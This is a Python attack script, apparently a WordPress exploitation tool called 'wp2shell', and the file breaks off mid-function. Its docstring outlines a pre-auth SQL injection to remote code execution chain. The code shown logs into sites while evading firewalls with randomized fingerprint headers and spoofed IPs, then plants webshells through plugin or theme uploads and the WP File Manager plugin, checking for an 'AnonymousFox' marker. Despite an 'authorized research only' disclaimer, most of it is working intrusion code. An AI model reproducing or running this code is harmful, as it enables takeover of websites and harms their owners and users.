#!/usr/bin/env python3
"""
wp2shell — CVE-2026-63030 + CVE-2026-60137 : WordPress core pre-auth RCE.

Our own single-file, stdlib-only implementation of the full crack-free chain,
built from the disclosed mechanics (Adam Kues / Searchlight; public PoCs by
Icex0, sergiointel, 0xsha). Everything below is WordPress CORE — no plugin,
no gadget, no hash cracking.

Chain
-----
1. REST /batch/v1 array desync (CVE-2026-63030): a malformed sub-request de-syncs
   $matches from $validation so a sub-request runs under the NEXT one's handler.
2. Nested twice, this smuggles a raw string `author_exclude` into WP_Query
   `author__not_in` (CVE-2026-60137) at the public `get_items` handler → SQLi:
       ... post_author NOT IN (<injection>) ...
3. Because the query has orderby=none and per_page is large, a UNION survives and
   returns attacker-fabricated rows as fake WP_Post objects (in-band UNION).
4. Crack-free admin creation: render a seed post with self-oEmbed shortcodes so
   core writes real `oembed_cache` posts; then forge a `customize_changeset`
   (owning user_id = an existing administrator) + `nav_menu_item` graph over those
   cache IDs, and append POST /wp/v2/users {roles:[administrator]} in the same
   batch. The customizer runs the changeset as the borrowed admin → a fresh admin
   is created. No password hash needed.
5. Log in as the new admin → upload a token-gated webshell plugin (core feature)
   → command execution.

Preconditions (all default): REST reachable, NO persistent object cache, >=1 post.
Affected 6.9.0-6.9.4 / 7.0.0-7.0.1. Fixed 6.9.5 / 7.0.2.

AUTHORIZED SECURITY RESEARCH ONLY. Creates an administrator and drops a webshell;
clean both up afterwards.
"""
from __future__ import annotations

import argparse, os, requests, random, string, binascii, codecs
import hashlib
import http.cookiejar
import io
import json
import re
import secrets
import shlex
import urllib3
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile, socket
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor
from types import SimpleNamespace
from colorama import Fore
from colorama import init
init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
fw = Fore.WHITE

requests.packages.urllib3.disable_warnings()

_PRIMER = {"method": "POST", "path": "///"}          # wp_parse_url() rejects -> WP_Error -> desync
_POST_DATE = "2020-01-01 00:00:00"
_OEMBED_ARGS = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
_SH = "WP2SHELL"
_CWD = "__wp2cwd__"
_TTY = sys.stdout.isatty()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers_F0x = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-GB,en;q=0.5'}

def _c(code: str, t: str) -> str:
    return f"\033[{code}m{t}\033[0m" if _TTY else t
def info(m): print(f"[*] {m}")
def good(m): print(_c("32", f"[+] {m}"))
def bad(m):  print(_c("31", f"[-] {m}"))
def warn(m): print(_c("33", f"[!] {m}"))
def _hex(t: str) -> str: return "''" if t == "" else "0x" + t.encode().hex()  # 0x with no digits is a MySQL syntax error

def domain_Fox_v2(site):
    site = str(site).strip().lower()
    if (site.startswith("http://")) : site = site.replace("http://", "")
    elif (site.startswith("https://")) : site = site.replace("https://", "")
    if ('www.' in site) : site = site.replace('www.', '')
    if (':' in site): site = site.rstrip().split(':')[0]
    if ('|' in site): site = site.rstrip().split('|')[0]
    if ('/' in site): site = site.rstrip().split('/')[0]
    return str(site)

def check_domain(domain):
    try:
        domain = domain_Fox_v2(domain.strip())
        socket.create_connection((domain, 443), timeout=5).close()
        return True
    except:
        return False

def URL_FOX(site):
    site = str(site)
    if (site.startswith('http://')) : site = site.replace('http://', ''); p = 'http://'
    elif (site.startswith('https://')) : site = site.replace('https://', ''); p = 'https://'
    else : p = 'http://'
    if (':' in site): site = site.rstrip().split(':')[0]
    if ('|' in site): site = site.rstrip().split('|')[0]
    if ('/' in site): site = site.rstrip().split('/')[0]
    return '{}{}'.format(p, site)

def file_get_contents_Fox(filename):
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        return f.read()

def get_random_headers():
    try:
        country_profiles = {
            'US': {
                'timezone': random.choice(['EST', 'CST', 'MST', 'PST']),
                'lang': 'en-US,en;q=0.9',
                'geo': random.choice(['New York', 'California', 'Texas', 'Florida'])
            },
            'UK': {
                'timezone': random.choice(['GMT', 'BST']),
                'lang': 'en-GB,en;q=0.9',
                'geo': random.choice(['London', 'Manchester', 'Birmingham'])
            },
            'DE': {
                'timezone': 'CET',
                'lang': 'de-DE,de;q=0.9,en;q=0.8',
                'geo': random.choice(['Berlin', 'Munich', 'Hamburg'])
            },
            'FR': {
                'timezone': 'CET',
                'lang': 'fr-FR,fr;q=0.9,en;q=0.8',
                'geo': random.choice(['Paris', 'Lyon', 'Marseille'])
            },
            'JP': {
                'timezone': 'JST',
                'lang': 'ja-JP,ja;q=0.9,en;q=0.8',
                'geo': random.choice(['Tokyo', 'Osaka', 'Kyoto'])
            },
            'BR': {
                'timezone': 'BRT',
                'lang': 'pt-BR,pt;q=0.9,en;q=0.8',
                'geo': random.choice(['Sao Paulo', 'Rio de Janeiro'])
            },
            'IN': {
                'timezone': 'IST',
                'lang': 'en-IN,en;q=0.9,hi;q=0.8',
                'geo': random.choice(['Mumbai', 'Delhi', 'Bangalore'])
            },
            'RU': {
                'timezone': 'MSK',
                'lang': 'ru-RU,ru;q=0.9,en;q=0.8',
                'geo': random.choice(['Moscow', 'St. Petersburg'])
            },
            'CN': {
                'timezone': 'CST',
                'lang': 'zh-CN,zh;q=0.9,en;q=0.8',
                'geo': random.choice(['Beijing', 'Shanghai', 'Guangzhou'])
            },
            'AU': {
                'timezone': 'AEST',
                'lang': 'en-AU,en;q=0.9',
                'geo': random.choice(['Sydney', 'Melbourne', 'Brisbane'])
            }
        }
        country = random.choice(list(country_profiles.keys()))
        profile = country_profiles[country]

        browser_choice = random.random()
        if (browser_choice < 0.45):  # 45% Chrome
            chrome_versions = [
                '120.0.6099.130', '121.0.6167.85', '119.0.6045.159',
                '122.0.6261.57', '118.0.5993.88'
            ]
            version = random.choice(chrome_versions)
            major = version.split('.')[0]

            # OS-specific Chrome builds
            os_profiles = [
                'Windows NT 10.0; Win64; x64',
                'Windows NT 11.0; Win64; x64',
                'Macintosh; Intel Mac OS X 10_15_7',
                'Macintosh; Intel Mac OS X 13_6_2',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64'
            ]
            os_string = random.choice(os_profiles)

            user_agent = 'Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(
                os_string, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(major, major),
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"' if 'Windows' in os_string else '"macOS"' if 'Mac' in os_string else '"Linux"',
                'Sec-Ch-Ua-Platform-Version': '"{}.0.0"'.format(random.randint(10, 15)),
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1'
            }

        elif (browser_choice < 0.70):  # 25% Firefox
            firefox_versions = ['121.0', '120.0.1', '119.0.1', '122.0', '118.0.2']
            version = random.choice(firefox_versions)

            os_profiles = [
                'Windows NT 10.0; Win64; x64',
                'Macintosh; Intel Mac OS X 10.15',
                'X11; Linux x86_64',
                'X11; Ubuntu; Linux x86_64; rv:' + version
            ]
            os_string = random.choice(os_profiles)

            user_agent = 'Mozilla/5.0 ({}) Gecko/20100101 Firefox/{}'.format(os_string, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1'
            }

        elif (browser_choice < 0.85):  # 15% Safari
            safari_versions = ['17.2.1', '17.1', '16.6.1', '17.0']
            version = random.choice(safari_versions)
            webkit = '605.1.15'
            mac_versions = ['10_15_7', '11_7_2', '12_6_2', '13_6_1']
            mac_version = random.choice(mac_versions)

            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X {}) AppleWebKit/{} (KHTML, like Gecko) Version/{} Safari/{}'.format(
                mac_version, webkit, version, webkit)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate'
            }

        else:  # 15% Edge
            edge_versions = ['120.0.2210.133', '121.0.2277.83', '119.0.2151.97']
            version = random.choice(edge_versions)
            major = version.split('.')[0]

            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36 Edg/{}'.format(
                major, version)

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': profile['lang'],
                'Accept-Encoding': 'gzip, deflate',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Microsoft Edge";v="{}"'.format(major, major),
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            }

        # Common headers for all browsers
        headers.update({
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', None]),
            'DNT': random.choice(['1', None]),
            'Pragma': random.choice(['no-cache', None])
        })
        # Advanced fingerprinting extras
        if random.random() < 0.3:
            headers['Viewport-Width'] = random.choice(['1920', '1366', '1440', '1536', '1280', '2560'])

        if random.random() < 0.2:
            headers['Device-Memory'] = random.choice(['8', '4', '16', '32'])

        if random.random() < 0.15:
            headers['X-Forwarded-For'] = '{}.{}.{}.{}'.format(random.randint(1, 255), random.randint(1, 255),
                                                              random.randint(1, 255), random.randint(1, 255))
        headers = {k: v for k, v in headers.items() if v is not None}
        return headers
    except:
        return headers_F0x

def get_random_login_headers(url):
    try:
        head = get_random_headers()
        head['referer'] = '{}/wp-admin/'.format(url)
        return head
    except:
        return headers_F0x

def content_Fox(req):
    if (sys.version_info[0] < 3):
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def requestG_Fox(url, typ, timeout = 20):
    try:
        timeout2 = timeout + 10
        try: check = requests.get(url, headers=get_random_headers(), verify=False, timeout=timeout)
        except: check = requests.get(url, headers=get_random_headers(), verify=False, timeout=timeout2)
        if ( typ == 1 ) : return content_Fox(check)
        else: return check
    except:
        return False

def random_Fox(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def en(src):
    return binascii.hexlify(str(codecs.encode(src, 'rot_13')).encode('utf8')).decode('utf8')[::-1]

def wp_login(url, username, password, pth, typ = 0):
    try:
        url_login = f"{url}{pth}"
        reqFox = requests.session()
        try: ck = content_Fox(reqFox.get('{}?wp_lang=en_US'.format(url_login), headers=get_random_headers(), verify=False, timeout=30))
        except:
            try: ck = content_Fox(reqFox.get('{}?wp_lang=en_US'.format(url_login), headers=get_random_headers(), verify=False, timeout=45))
            except:
                time.sleep(15)
                ck = content_Fox(reqFox.get('{}?wp_lang=en_US'.format(url_login), headers=get_random_headers(), verify=False, timeout=60))
        loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
        try: login_Fox = reqFox.post(url_login, data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=30)
        except:
            try: login_Fox = reqFox.post(url_login, data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=45)
            except:
                try: login_Fox = reqFox.post(url_login, data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=60)
                except:
                    time.sleep(15)
                    login_Fox = reqFox.post(url_login, data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=60)
        login_Fox = content_Fox(login_Fox)
        if ('<title>One moment, please...</title>' in login_Fox): return 'ImunifyAV'
        elif ('<title>Just a moment...</title>' in login_Fox): return 'Cloudflare'
        elif ('<title>Sucuri WebSite Firewall - Access Denied</title>' in login_Fox): return 'Sucuri'
        elif ('Jetpack has locked' in login_Fox): return 'Jetpack'
        elif ('</b> attempt(s) left' in login_Fox): return 'Loginizer'
        elif ('profile/login' in login_Fox):
            id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
            myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
            loginPost_Fox = {'template': 'login', 'unique_id': '{}'.format(id_wp), 'up_username': '0', 'user_action': '',
                             '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                            'action': 'userpro_process_form',
                            'force_redirect_uri-{}'.format(id_wp): '0', 'group': 'default',
                            'redirect_uri-{}'.format(id_wp): '', 'shortcode': '',
                            'user_pass-{}'.format(id_wp): password, 'username_or_email-{}'.format(id_wp): username}
            try: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=30)
            except: login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=get_random_login_headers(url), verify=False, timeout=45)
        try: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=get_random_headers(), verify=False, timeout=30))
        except:
            try: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=get_random_headers(), verify=False, timeout=45))
            except:
                try: check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=get_random_headers(), verify=False, timeout=60))
                except:
                    time.sleep(15)
                    check = content_Fox(reqFox.get('{}/wp-admin/'.format(url), headers=get_random_headers(), verify=False, timeout=60))
        if ('<title>One moment, please...</title>' in check): return 'ImunifyAV'
        elif ('<title>Just a moment...</title>' in check): return 'Cloudflare'
        elif ('<title>Sucuri WebSite Firewall - Access Denied</title>' in check): return 'Sucuri'
        elif ('Jetpack has locked' in login_Fox): return 'Jetpack'
        elif ('/wp-admin/profile.php' in check or 'confirm_admin_email_nonce' in check or ('upgrade.php' in check and typ == 0)):
            if ('upgrade.php' in check):
                try: upgrade = content_Fox(reqFox.get('{}/wp-admin/upgrade.php?step=1&amp;backto=%2Fwp-admin%2F'.format(url), headers=get_random_headers(), verify=False, timeout=30))
                except:
                    try: upgrade = content_Fox(reqFox.get('{}/wp-admin/upgrade.php?step=1&amp;backto=%2Fwp-admin%2F'.format(url), headers=get_random_headers(), verify=False, timeout=45))
                    except:
                        time.sleep(15)
                        upgrade = content_Fox(reqFox.get('{}/wp-admin/upgrade.php?step=1&amp;backto=%2Fwp-admin%2F'.format(url), headers=get_random_headers(), verify=False, timeout=60))
                return wp_login(url, username, passwords, pth, 1)
            return reqFox
        return 'failed'
    except:
        return 'timeOut'

def randomPluginWP_Fox(url, cookies):
    try:
        foldername = random_Fox(7)
        try:plugin_install_php = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?tab=upload'.format(url), headers=get_random_headers(), timeout=15))
        except: plugin_install_php = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?tab=upload'.format(url), headers=get_random_headers(), verify=False, timeout=10))
        if (not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)): return 'F'
        ID_wp = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)[0]
        if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
        filedata_Fox = {'_wpnonce': ID_wp, '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload', 'install-plugin-submit': 'Install Now'}
        fileup_Fox = {'pluginzip': ('{}.zip'.format(foldername), open('Files/plugin.zip', 'rb'), 'multipart/form-data')}
        try: upload = cookies.post('{}/wp-admin/update.php?action=upload-plugin'.format(url), data=filedata_Fox, files=fileup_Fox, headers=get_random_headers(), timeout=60)
        except: upload = cookies.post('{}/wp-admin/update.php?action=upload-plugin'.format(url), data=filedata_Fox, files=fileup_Fox, headers=get_random_headers(), verify=False, timeout=60)
        shellname = '{}/wp-content/plugins/{}/index.php'.format(url, foldername)
        check = requestG_Fox(shellname, 1)
        if ('AnonymousFox' in check): return shellname
        return 'F'
    except:
        return 'F'

def randomThemeWP_Fox(url, cookies) :
    try:
        foldername = random_Fox(7)
        try: theme_install_php = content_Fox(cookies.get('{}/wp-admin/theme-install.php?tab=upload'.format(url), headers=get_random_headers(), timeout=15))
        except: theme_install_php = content_Fox(cookies.get('{}/wp-admin/theme-install.php?tab=upload'.format(url), headers=get_random_headers(), verify=False, timeout=10))
        if (not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)): return 'F'
        ID_wp = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)[0]
        if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
        filedata_Fox = {'_wpnonce': ID_wp, '_wp_http_referer': '/wp-admin/theme-install.php?tab=upload', 'install-theme-submit': 'Installer'}
        fileup_Fox = {'themezip': ('{}.zip'.format(foldername), open('Files/theme.zip', 'rb'), 'multipart/form-data')}
        try: upload_Fox = cookies.post('{}/wp-admin/update.php?action=upload-theme'.format(url), data=filedata_Fox, files=fileup_Fox, headers=get_random_headers(), timeout=60)
        except: upload_Fox = cookies.post('{}/wp-admin/update.php?action=upload-theme'.format(url), data=filedata_Fox, files=fileup_Fox, headers=get_random_headers(), verify=False, timeout=90)
        shellname = '{}/wp-content/themes/{}/archive.php'.format(url, foldername)
        check = requestG_Fox(shellname, 1)
        if ('AnonymousFox' in check): return shellname
        return 'F'
    except :
        return 'F'

def wp_file_manager_Fox(domain, cookies) :
    try :
        filename = '{}.php'.format(random_Fox(8))
        shell = file_get_contents_Fox('Files/403.php')
        try: getID = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term'.format(domain),  verify=False, headers=get_random_headers(), timeout=15))
        except: getID = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term'.format(domain),  verify=False, headers=get_random_headers(), timeout=10))
        if ('admin.php?page=wp_file_manager' in getID) :
            try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=15))
            except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=10))
            if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=60)
                except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=45)
                check_UP = requestG_Fox('{}/{}'.format(domain, filename), 1)
                if ('AnonymousFox' in check_UP) : return'{}/{}'.format(domain, filename)
        elif (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), getID) or re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)) :
            if (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), getID)): ID_wp = re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), getID)[0]
            elif (re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)) : ID_wp = re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)[0]
            elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)[0][0]
            elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)[0][0]
            try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=45)
            except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=30)
            try : getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=15))
            except : getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=10))
            if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=60)
                except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=45)
                check_UP = requestG_Fox('{}/{}'.format(domain,filename), 1)
                if ('AnonymousFox' in check_UP) : return '{}/{}'.format(domain, filename)
        elif (re.findall(re.compile('\\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)):
            ID_wp = re.findall(re.compile('\\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)[0][0]
            try: upgrade = content_Fox(cookies.get('{}/wp-admin/update.php?action=upgrade-plugin&plugin=wp-file-manager%2Ffile_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=45))
            except: upgrade = content_Fox(cookies.get('{}/wp-admin/update.php?action=upgrade-plugin&plugin=wp-file-manager%2Ffile_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=30))
            if (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), upgrade) or re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)) :
                if (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), upgrade)): ID_wp = re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), upgrade)[0]
                elif (re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)) : ID_wp = re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)[0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)[0][0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)[0][0]
                try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=45)
                except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=30)
                try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=15))
                except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=get_random_headers(), timeout=10))
                if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                    ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                    if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                    fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                    filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                    try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=60)
                    except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=get_random_headers(), timeout=45)
                    check_UP = requestG_Fox('{}/{}'.format(domain, filename), 1)
                    if ('AnonymousFox' in check_UP): return '{}/{}'.format(domain, filename)
        elif (re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)) :
            ID_wp = re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)[0][0]
            try : donwload = content_Fox(cookies.get('{}/wp-admin/update.php?action=install-plugin&plugin=wp-file-manager&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=45))
            except : donwload = content_Fox(cookies.get('{}/wp-admin/update.php?action=install-plugin&plugin=wp-file-manager&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=get_random_headers(), timeout=30))
            if (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), donwload) or re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)) :
                if (re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), donwload)) : ID_wp = re.findall(re.compile('&#038;plugin=wp-file-manager&#038;_wpnonce=(.*)".*/>'), donwload)[0]
                elif (re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)) : ID_wp = re.findall(re.compile('plugins.php\\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)[0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)[0][0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)[0][0]
